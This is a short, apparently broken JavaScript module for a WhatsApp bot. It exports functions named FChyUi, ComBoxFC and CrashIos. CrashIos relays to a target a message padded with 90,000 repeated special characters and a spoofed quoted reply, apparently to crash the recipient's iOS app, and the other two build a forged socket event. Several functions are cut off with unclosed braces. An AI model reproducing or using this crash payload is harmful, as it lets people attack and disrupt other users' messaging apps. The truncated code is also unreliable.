async function FChyUi(sock, target) {
  let hyuiForceX = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] }

async function ComBoxFC(sock, target) {
  let hyuiForceX2 = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] }

async function CrashIos(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "ꦾ".repeat(90000),
          }

module.exports = { FChyUi, ComBoxFC, CrashIos };